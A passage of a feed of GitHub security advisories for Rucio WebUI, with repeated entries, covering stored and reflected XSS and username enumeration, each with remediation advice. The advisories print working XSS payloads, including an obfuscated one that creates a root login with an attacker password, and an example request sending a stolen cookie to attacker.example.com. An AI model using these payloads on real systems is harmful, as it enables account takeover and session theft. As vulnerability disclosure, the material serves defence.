+<li>OWASP XSS Prevention Cheat Sheet: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rucio/rucio/security/advisories/GHSA-rwj9-7j48-9f7q">https://github.com/rucio/rucio/security/advisories/GHSA-rwj9-7j48-9f7q</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/35.8.3">https://github.com/rucio/rucio/releases/tag/35.8.3</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/38.5.4">https://github.com/rucio/rucio/releases/tag/38.5.4</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/39.3.1">https://github.com/rucio/rucio/releases/tag/39.3.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-rwj9-7j48-9f7q">https://github.com/advisories/GHSA-rwj9-7j48-9f7q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rwj9-7j48-9f7q</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-02-25T18:58:20.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[rucio-webui] Rucio WebUI Vulnerable to Stored Cross-site Scripting (XSS) through Custom Rule Function]]></title>
+        <id>https://github.com/advisories/GHSA-rwj9-7j48-9f7q</id>
+        <link href="https://github.com/advisories/GHSA-rwj9-7j48-9f7q"/>
+        <updated>2026-02-25T18:58:22.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A stored Cross-site Scripting (XSS) vulnerability was identified in the Custom Rules function of the WebUI where attacker-controlled input is persisted by the backend and later rendered in the WebUI without proper output encoding. This allows arbitrary JavaScript execution in the context of the WebUI for users who view affected pages, potentially enabling session token theft or unauthorized actions.</p>
+<hr>
+<h3 id="details">Details</h3>
+<p>A malicious payload supplied in the <code>comment</code> field is stored by the backend. When the rule is later viewed or approved, the stored script executes in the WebUI origin.</p>
+<p><strong>Create Path</strong>:<br>Monitoring &gt; Subscriptions and Rules &gt; Request New Rule &gt; Options &gt; Add Comment</p>
+<p><strong>Trigger Paths</strong>:  </p>
+<ul>
+<li><strong>User Trigger</strong>: Monitoring &gt; Subscriptions and Rules &gt; Show My Rules &gt; <em>RULE NAME</em><br>(<code>https://localhost:8443/ui/rule?rule_id=&lt;RULE_ID&gt;</code>)</li>
+<li><strong>Admin Trigger</strong>: Data Transfer (R2D2) &gt; Approve Rules &gt; <em>RULE NAME</em></li>
+</ul>
+<p><strong>Create Request</strong></p>
+<pre><code class="language-http">POST /proxy/rules/ HTTP/1.1
+...
+{"dids":[{"scope":"test","name":"dataset1"}],"account":"pentest","ask_approval":true,"activity":"User Subscriptions","rse_expression":"WEB1","copies":1,"grouping":"DATASET","lifetime":15552000,"comment":"&lt;script&gt;alert(document.cookie)&lt;/script&gt;","asynchronous":false,"notify":"N"}
+</code></pre>
+<p><strong>Response</strong></p>
+<pre><code class="language-http">HTTP/1.1 201 CREATED
+...
+["c2d675c1979d4549b26eede3531a7e6a"]
+</code></pre>
+<p><strong>Creating RSE with XSS payload in comment</strong>
+<img src="https://github.com/user-attachments/assets/00258839-5288-48ed-856c-30cfee19d3c4" alt="Creating RSE with XSS payload in comment" height="667" width="1032"></p>
+<p><strong>Reviewing rule creation requests</strong>
+<img src="https://github.com/user-attachments/assets/1b5fc7af-a664-42dc-a3d4-b00755fe2bd7" alt="Reviewing rule creation requests" height="625" width="1201"></p>
+<p><strong>XSS Payload triggering on rule review</strong>
+<img src="https://github.com/user-attachments/assets/463e843a-1e9e-492e-960f-7d3edac2fd1e" alt="XXS Payload triggering on rule review" height="417" width="1197"></p>
+<hr>
+<h3 id="impact">Impact</h3>
+<p>Any authenticated user who views affected resources may execute attacker-controlled JavaScript in the WebUI origin. Depending on the affected feature, this may impact all users or administrative users only.</p>
+<p>The impact is amplified by:</p>
+<ul>
+<li>Session cookies that are accessible to JavaScript (missing HttpOnly flag).</li>
+<li>API tokens exposed to the WebUI via JavaScript variables.</li>
+</ul>
+<p>An attacker would likely attempt to exfiltrate the session token to an external site by setting an encoded version of the cookie as the path of a GET request to an attacker controlled site (i.e <code>GET https://attacker.example.com/rucio/{BASE64_COOKIE}</code>).</p>
+<p>Attackers can also perform actions as the victim like creating a new UserPass identity with an attacker known password, creating/deleting an RSE, or exfiltrating data.</p>
+<p><strong>XSS Payload to Create Root UserPass</strong></p>
+<pre><code class="language-html">&lt;img src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()&gt;
+</code></pre>
+<hr>
+<h3 id="remediation--mitigation">Remediation / Mitigation</h3>
+<p>All client-side renderings of server-provided or user-controlled data must ensure proper HTML escaping before insertion into the DOM. Unsafe methods such as <code>.html()</code> should be avoided unless the content is explicitly sanitized. Safer alternatives include <code>.text()</code>, creating text nodes, or using a templating system that enforces automatic escaping.</p>
+<p>Additional defense-in-depth measures include:</p>
+<ul>
+<li>Enforcing a strict Content Security Policy (CSP).</li>
+<li>Setting the HttpOnly flag on session cookies.</li>
+<li>Avoiding exposure of API tokens in JavaScript-accessible variables.</li>
+</ul>
+<blockquote>
+<p>Note that many pages were found setting the API token as <code>token</code> in an authenticated response like <code>var token = "root-root-webui-...:"</code> (See <code>/ui/list_accounts</code> for example)</p>
+</blockquote>
+<hr>
+<h3 id="resources">Resources</h3>
+<ul>
+<li>OWASP XSS Prevention Cheat Sheet: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rucio/rucio/security/advisories/GHSA-rwj9-7j48-9f7q">https://github.com/rucio/rucio/security/advisories/GHSA-rwj9-7j48-9f7q</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/35.8.3">https://github.com/rucio/rucio/releases/tag/35.8.3</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/38.5.4">https://github.com/rucio/rucio/releases/tag/38.5.4</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/39.3.1">https://github.com/rucio/rucio/releases/tag/39.3.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-rwj9-7j48-9f7q">https://github.com/advisories/GHSA-rwj9-7j48-9f7q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rwj9-7j48-9f7q</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-02-25T18:58:20.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[rucio-webui] Rucio WebUI has Username Enumeration via Login Error Message]]></title>
+        <id>https://github.com/advisories/GHSA-38wq-6q2w-hcf9</id>
+        <link href="https://github.com/advisories/GHSA-38wq-6q2w-hcf9"/>
+        <updated>2026-02-25T18:53:43.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The WebUI login endpoint returns distinct error messages depending on whether a supplied username exists, allowing unauthenticated attackers to enumerate valid usernames.</p>
+<h3 id="details">Details</h3>
+<p>When submitting invalid credentials to <code>/ui/login</code>, the WebUI responds with different error messages based on the existence of the provided username (identity). A non-existent username results in an error indicating that no account is associated with the identity, while an existing username with an incorrect password produces a different authentication-related error.</p>
+<p>This behavioral difference allows an attacker to distinguish valid usernames from invalid ones by observing the response content.</p>
+<h3 id="proof-of-concept">Proof of Concept</h3>
+<p><strong>Bogus Login (Non-existent Username "15251087")</strong><br>Response contains:</p>
+<pre><code>Cannot get find any account associated with 15251087 identity.
+</code></pre>
+<p><strong>Bogus Login (Existing Username "root", Wrong Password)</strong><br>Response contains:</p>
+<pre><code>Cannot get auth token. It is possible that the presented identity root is not mapped to any Rucio account root.
+</code></pre>
+<p>The difference in error messages confirms whether a username exists.</p>
+<h3 id="impact">Impact</h3>
+<p>An unauthenticated attacker can enumerate valid usernames, which may be leveraged for targeted password guessing, credential stuffing, or social engineering attacks.</p>
+<h3 id="remediation--mitigation">Remediation / Mitigation</h3>
+<p>Return a generic authentication failure message for all login errors, regardless of whether the username exists. Avoid disclosing account or identity existence through error responses. Consider implementing rate limiting or additional login throttling to further reduce abuse.</p>
+<h4 id="reources">Reources:</h4>
+<ul>
+<li>OWASP Authentication Cheat Sheet -  Authentication and Error Messages: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#authentication-and-error-messages">https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#authentication-and-error-messages</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rucio/rucio/security/advisories/GHSA-38wq-6q2w-hcf9">https://github.com/rucio/rucio/security/advisories/GHSA-38wq-6q2w-hcf9</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#authentication-and-error-messages">https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#authentication-and-error-messages</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/35.8.3">https://github.com/rucio/rucio/releases/tag/35.8.3</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/38.5.4">https://github.com/rucio/rucio/releases/tag/38.5.4</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/39.3.1">https://github.com/rucio/rucio/releases/tag/39.3.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-38wq-6q2w-hcf9">https://github.com/advisories/GHSA-38wq-6q2w-hcf9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-38wq-6q2w-hcf9</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-02-25T18:53:42.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[rucio-webui] Rucio WebUI has Username Enumeration via Login Error Message]]></title>
+        <id>https://github.com/advisories/GHSA-38wq-6q2w-hcf9</id>
+        <link href="https://github.com/advisories/GHSA-38wq-6q2w-hcf9"/>
+        <updated>2026-02-25T18:53:43.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The WebUI login endpoint returns distinct error messages depending on whether a supplied username exists, allowing unauthenticated attackers to enumerate valid usernames.</p>
+<h3 id="details">Details</h3>
+<p>When submitting invalid credentials to <code>/ui/login</code>, the WebUI responds with different error messages based on the existence of the provided username (identity). A non-existent username results in an error indicating that no account is associated with the identity, while an existing username with an incorrect password produces a different authentication-related error.</p>
+<p>This behavioral difference allows an attacker to distinguish valid usernames from invalid ones by observing the response content.</p>
+<h3 id="proof-of-concept">Proof of Concept</h3>
+<p><strong>Bogus Login (Non-existent Username "15251087")</strong><br>Response contains:</p>
+<pre><code>Cannot get find any account associated with 15251087 identity.
+</code></pre>
+<p><strong>Bogus Login (Existing Username "root", Wrong Password)</strong><br>Response contains:</p>
+<pre><code>Cannot get auth token. It is possible that the presented identity root is not mapped to any Rucio account root.
+</code></pre>
+<p>The difference in error messages confirms whether a username exists.</p>
+<h3 id="impact">Impact</h3>
+<p>An unauthenticated attacker can enumerate valid usernames, which may be leveraged for targeted password guessing, credential stuffing, or social engineering attacks.</p>
+<h3 id="remediation--mitigation">Remediation / Mitigation</h3>
+<p>Return a generic authentication failure message for all login errors, regardless of whether the username exists. Avoid disclosing account or identity existence through error responses. Consider implementing rate limiting or additional login throttling to further reduce abuse.</p>
+<h4 id="reources">Reources:</h4>
+<ul>
+<li>OWASP Authentication Cheat Sheet -  Authentication and Error Messages: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#authentication-and-error-messages">https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#authentication-and-error-messages</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rucio/rucio/security/advisories/GHSA-38wq-6q2w-hcf9">https://github.com/rucio/rucio/security/advisories/GHSA-38wq-6q2w-hcf9</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#authentication-and-error-messages">https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#authentication-and-error-messages</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/35.8.3">https://github.com/rucio/rucio/releases/tag/35.8.3</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/38.5.4">https://github.com/rucio/rucio/releases/tag/38.5.4</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/39.3.1">https://github.com/rucio/rucio/releases/tag/39.3.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-38wq-6q2w-hcf9">https://github.com/advisories/GHSA-38wq-6q2w-hcf9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-38wq-6q2w-hcf9</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-02-25T18:53:42.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[rucio-webui] Rucio WebUI has Username Enumeration via Login Error Message]]></title>
+        <id>https://github.com/advisories/GHSA-38wq-6q2w-hcf9</id>
+        <link href="https://github.com/advisories/GHSA-38wq-6q2w-hcf9"/>
+        <updated>2026-02-25T18:53:43.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The WebUI login endpoint returns distinct error messages depending on whether a supplied username exists, allowing unauthenticated attackers to enumerate valid usernames.</p>
+<h3 id="details">Details</h3>
+<p>When submitting invalid credentials to <code>/ui/login</code>, the WebUI responds with different error messages based on the existence of the provided username (identity). A non-existent username results in an error indicating that no account is associated with the identity, while an existing username with an incorrect password produces a different authentication-related error.</p>
+<p>This behavioral difference allows an attacker to distinguish valid usernames from invalid ones by observing the response content.</p>
+<h3 id="proof-of-concept">Proof of Concept</h3>
+<p><strong>Bogus Login (Non-existent Username "15251087")</strong><br>Response contains:</p>
+<pre><code>Cannot get find any account associated with 15251087 identity.
+</code></pre>
+<p><strong>Bogus Login (Existing Username "root", Wrong Password)</strong><br>Response contains:</p>
+<pre><code>Cannot get auth token. It is possible that the presented identity root is not mapped to any Rucio account root.
+</code></pre>
+<p>The difference in error messages confirms whether a username exists.</p>
+<h3 id="impact">Impact</h3>
+<p>An unauthenticated attacker can enumerate valid usernames, which may be leveraged for targeted password guessing, credential stuffing, or social engineering attacks.</p>
+<h3 id="remediation--mitigation">Remediation / Mitigation</h3>
+<p>Return a generic authentication failure message for all login errors, regardless of whether the username exists. Avoid disclosing account or identity existence through error responses. Consider implementing rate limiting or additional login throttling to further reduce abuse.</p>
+<h4 id="reources">Reources:</h4>
+<ul>
+<li>OWASP Authentication Cheat Sheet -  Authentication and Error Messages: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#authentication-and-error-messages">https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#authentication-and-error-messages</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rucio/rucio/security/advisories/GHSA-38wq-6q2w-hcf9">https://github.com/rucio/rucio/security/advisories/GHSA-38wq-6q2w-hcf9</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#authentication-and-error-messages">https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#authentication-and-error-messages</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/35.8.3">https://github.com/rucio/rucio/releases/tag/35.8.3</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/38.5.4">https://github.com/rucio/rucio/releases/tag/38.5.4</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/39.3.1">https://github.com/rucio/rucio/releases/tag/39.3.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-38wq-6q2w-hcf9">https://github.com/advisories/GHSA-38wq-6q2w-hcf9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-38wq-6q2w-hcf9</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-02-25T18:53:42.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[rucio-webui] Rucio WebUI has a Reflected Cross-site Scripting Vulnerability]]></title>
+        <id>https://github.com/advisories/GHSA-h79m-5jjm-jm4q</id>
+        <link href="https://github.com/advisories/GHSA-h79m-5jjm-jm4q"/>
+        <updated>2026-02-25T18:53:32.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A reflected Cross-site Scripting vulnerability was located in the rendering of the ExceptionMessage of the WebUI 500 error which could allow attackers to steal login session tokens of users who navigate to a specially crafted URL.</p>
+<h4 id="details">Details</h4>
+<p>The WebUI error message renders <code>ExceptionMessage</code> (which can contain user-controlled input) as unencoded HTML. Server code that produces the message is in <code>common.py</code> - specifically <code>error_headers -&gt; _error_response -&gt; generate_http_error_flask</code>, which places <code>ExceptionMessage</code> into both response headers and the JSON body. The WebUI client then injects that text into the DOM using unsafe methods (examples in <code>lib/rucio/web/ui/static/*.js</code> such as <code>rule.js</code>, <code>request_rule.js</code>, <code>list_rules.js</code>) with <code>jQuery.html(...)</code> or equivalent, enabling reflected XSS when an attacker-controlled value is included in an error message (e.g. account, attribute, scope).</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Reflected XSS via account parameter (browse or load URL in WebUI context):</li>
+</ol>
+<pre><code class="language-text">https://127.0.0.1:8443/ui/account_rse_usage?account=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
+</code></pre>
+<p>Server response (excerpt):</p>
+<pre><code class="language-http">HTTP/1.1 500 INTERNAL SERVER ERROR
+ExceptionClass: AccountNotFound
+ExceptionMessage: Account &lt;img src=x onerror=alert(document.cookie)&gt; does not exist
+Content-Type: application/octet-stream
+
+{"ExceptionClass":"AccountNotFound","ExceptionMessage":"Account &lt;img src=x onerror=alert(document.cookie)&gt; does not exist"}
+</code></pre>
+<p><strong>XSS payload triggering (Displaying session token) when browsing to crafted URL</strong>
+<img src="https://github.com/user-attachments/assets/989a0aed-628d-4f1c-bbfb-de434dab8af6" alt="XSS payload triggering (Displaying session token) when browsing to crafted URL" height="510" width="1210"></p>
+<p>When the WebUI inserts <code>ExceptionMessage</code> into the page with <code>.html(...)</code>, the injected <img> executes and displays the users' session tokens. Note that this is a PoC only, an attacker would likely attempt to exfiltrate the session token to an external site by setting an encoded version of the cookie as the path of a GET request to an attacker controlled site (i.e <code>GET https://attacker.example.com/rucio/{BASE64_COOKIE}</code>).</p>
+<ol start="2">
+<li>Reflected XSS via account key attribute creation error:</li>
+</ol>
+<pre><code class="language-http">POST /proxy/accounts/pentest/attr/XSS HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Origin: https://127.0.0.1:8443
+X-Rucio-Script: webui::-ui-account
+{"key":"XSS","value":"&lt;script&gt;alert(document.cookie)&lt;/script&gt;"}
+</code></pre>
+<p><strong>XSS payload triggering (Displaying session token) on error when creating account key</strong>
+<img src="https://github.com/user-attachments/assets/151cb0ad-e4f0-498e-954e-be3455ca8a72" alt="XSS payload triggering (Displaying session token) on error when creating account key" height="593" width="1322"></p>
+<p>Server response (excerpt) contains <code>ExceptionMessage</code> with the raw <code>&lt;script&gt;</code> payload; the WebUI renders it unsafely and script executes. Note that this method is less impactful since it's not something that can be triggered with a URL alone, but is listed to show that this issue affects multiple locations.</p>
+<h3 id="impact">Impact</h3>
+<p>Any authenticated WebUI user who follows a crafted link or triggers a request containing attacker-controlled input in a field that causes an error may execute arbitrary JavaScript in the WebUI origin. This vulnerability is more impactful due to the lack of protection of cookies (The Session token does not have HttpOnly attribute) and lack of Content Security Policy that would prevent thrid-party scripts from loading.</p>
+<p>Attackers can steal session cookies/tokens or perform actions as the victim like creating a new UserPass identity with an attacker known password. </p>
+<p><strong>Example URL to Create UserPass for Root</strong></p>
+<pre><code>https://localhost:8443/ui/account_rse_usage?account=%3Cimg%20src%3Dx%20onerror%3D(function()%7Bo%3D%7B%7D%3Bo.method%3D'PUT'%3Bo.credentials%3D'include'%3Bo.headers%3D%7B'X-Rucio-Username'%3A'attackeruser'%2C'X-Rucio-Password'%3A'AttackerPassword123'%2C'X-Rucio-Email'%3A'demo%40example.org'%2C'X-Rucio-Auth-Token'%3Atoken%7D%3Bfetch(String.fromCharCode(47)%2B'identities'%2BString.fromCharCode(47)%2B'root'%2BString.fromCharCode(47)%2B'userpass'%2Co)%7D)()%3E
+</code></pre>
+<p><strong>Account Payload to Create UserPass</strong></p>
+<pre><code class="language-html">&lt;img src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()&gt;
+</code></pre>
+<p><strong>Creating identity for Root account via reflected XSS</strong>
+<img src="https://github.com/user-attachments/assets/539bfff4-70f3-42c5-b83a-10b5f85d6d44" alt="Creating identity for Root account via reflected XSS" height="957" width="1558"></p>
+<p>All WebUI users are impacted.</p>
+<h3 id="remediation--mitigation">Remediation / Mitigation</h3>
+<p>Change all client-side insertions of server-provided text from <code>.html(...)</code> to <code>.text()</code> or create text nodes / escape HTML before insertion. Example: replace <code>$('#elem').html(msg)</code> with <code>$('#elem').empty().append($('&lt;span&gt;').text(msg))</code>.</p>
+<p>Additionally, consider adding a Content Security Policy (CSP) to mitigate external script execution and set the HTTPOnly flag for session cookies. Also, the API token should not be set in a JavaScript variable as it can be accessed by an attacker even with the HTTPOnly flag set on the session cookie.</p>
+<blockquote>
+<p>Note that many pages were found setting the API token as <code>token</code> in an authenticated response like <code>var token = "root-root-webui-...:"</code> (See <code>/ui/list_accounts</code> for example)</p>
+</blockquote>
+<h4 id="references">References:</h4>
+<ul>
+<li>Server functions: <code>common.py</code> (<code>error_headers</code>, <code>_error_response, generate_http_error_flask</code>)</li>
+<li>Example client files to fix: <code>lib/rucio/web/ui/static/rule.js</code>, <code>lib/rucio/web/ui/static/request_rule.js, list_rules.js</code></li>
+<li>OWASP XSS Prevention Cheat Sheet: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/rucio/rucio/security/advisories/GHSA-h79m-5jjm-jm4q">https://github.com/rucio/rucio/security/advisories/GHSA-h79m-5jjm-jm4q</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/35.8.3">https://github.com/rucio/rucio/releases/tag/35.8.3</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/38.5.4">https://github.com/rucio/rucio/releases/tag/38.5.4</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/39.3.1">https://github.com/rucio/rucio/releases/tag/39.3.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-h79m-5jjm-jm4q">https://github.com/advisories/GHSA-h79m-5jjm-jm4q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h79m-5jjm-jm4q</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-02-25T18:53:29.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[rucio-webui] Rucio WebUI has a Reflected Cross-site Scripting Vulnerability]]></title>
+        <id>https://github.com/advisories/GHSA-h79m-5jjm-jm4q</id>
+        <link href="https://github.com/advisories/GHSA-h79m-5jjm-jm4q"/>
+        <updated>2026-02-25T18:53:32.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A reflected Cross-site Scripting vulnerability was located in the rendering of the ExceptionMessage of the WebUI 500 error which could allow attackers to steal login session tokens of users who navigate to a specially crafted URL.</p>
+<h4 id="details">Details</h4>
+<p>The WebUI error message renders <code>ExceptionMessage</code> (which can contain user-controlled input) as unencoded HTML. Server code that produces the message is in <code>common.py</code> - specifically <code>error_headers -&gt; _error_response -&gt; generate_http_error_flask</code>, which places <code>ExceptionMessage</code> into both response headers and the JSON body. The WebUI client then injects that text into the DOM using unsafe methods (examples in <code>lib/rucio/web/ui/static/*.js</code> such as <code>rule.js</code>, <code>request_rule.js</code>, <code>list_rules.js</code>) with <code>jQuery.html(...)</code> or equivalent, enabling reflected XSS when an attacker-controlled value is included in an error message (e.g. account, attribute, scope).</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Reflected XSS via account parameter (browse or load URL in WebUI context):</li>
+</ol>
+<pre><code class="language-text">https://127.0.0.1:8443/ui/account_rse_usage?account=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
+</code></pre>
+<p>Server response (excerpt):</p>
+<pre><code class="language-http">HTTP/1.1 500 INTERNAL SERVER ERROR
+ExceptionClass: AccountNotFound
+ExceptionMessage: Account &lt;img src=x onerror=alert(document.cookie)&gt; does not exist
+Content-Type: application/octet-stream
+
+{"ExceptionClass":"AccountNotFound","ExceptionMessage":"Account &lt;img src=x onerror=alert(document.cookie)&gt; does not exist"}
+</code></pre>
+<p><strong>XSS payload triggering (Displaying session token) when browsing to crafted URL</strong>
+<img src="https://github.com/user-attachments/assets/989a0aed-628d-4f1c-bbfb-de434dab8af6" alt="XSS payload triggering (Displaying session token) when browsing to crafted URL" height="510" width="1210"></p>
+<p>When the WebUI inserts <code>ExceptionMessage</code> into the page with <code>.html(...)</code>, the injected <img> executes and displays the users' session tokens. Note that this is a PoC only, an attacker would likely attempt to exfiltrate the session token to an external site by setting an encoded version of the cookie as the path of a GET request to an attacker controlled site (i.e <code>GET https://attacker.example.com/rucio/{BASE64_COOKIE}</code>).</p>
+<ol start="2">
+<li>Reflected XSS via account key attribute creation error:</li>
+</ol>
+<pre><code class="language-http">POST /proxy/accounts/pentest/attr/XSS HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Origin: https://127.0.0.1:8443
+X-Rucio-Script: webui::-ui-account
+{"key":"XSS","value":"&lt;script&gt;alert(document.cookie)&lt;/script&gt;"}
+</code></pre>
+<p><strong>XSS payload triggering (Displaying session token) on error when creating account key</strong>
+<img src="https://github.com/user-attachments/assets/151cb0ad-e4f0-498e-954e-be3455ca8a72" alt="XSS payload triggering (Displaying session token) on error when creating account key" height="593" width="1322"></p>
+<p>Server response (excerpt) contains <code>ExceptionMessage</code> with the raw <code>&lt;script&gt;</code> payload; the WebUI renders it unsafely and script executes. Note that this method is less impactful since it's not something that can be triggered with a URL alone, but is listed to show that this issue affects multiple locations.</p>
+<h3 id="impact">Impact</h3>
+<p>Any authenticated WebUI user who follows a crafted link or triggers a request containing attacker-controlled input in a field that causes an error may execute arbitrary JavaScript in the WebUI origin. This vulnerability is more impactful due to the lack of protection of cookies (The Session token does not have HttpOnly attribute) and lack of Content Security Policy that would prevent thrid-party scripts from loading.</p>
+<p>Attackers can steal session cookies/tokens or perform actions as the victim like creating a new UserPass identity with an attacker known password. </p>
+<p><strong>Example URL to Create UserPass for Root</strong></p>
+<pre><code>https://localhost:8443/ui/account_rse_usage?account=%3Cimg%20src%3Dx%20onerror%3D(function()%7Bo%3D%7B%7D%3Bo.method%3D'PUT'%3Bo.credentials%3D'include'%3Bo.headers%3D%7B'X-Rucio-Username'%3A'attackeruser'%2C'X-Rucio-Password'%3A'AttackerPassword123'%2C'X-Rucio-Email'%3A'demo%40example.org'%2C'X-Rucio-Auth-Token'%3Atoken%7D%3Bfetch(String.fromCharCode(47)%2B'identities'%2BString.fromCharCode(47)%2B'root'%2BString.fromCharCode(47)%2B'userpass'%2Co)%7D)()%3E
+</code></pre>
+<p><strong>Account Payload to Create UserPass</strong></p>
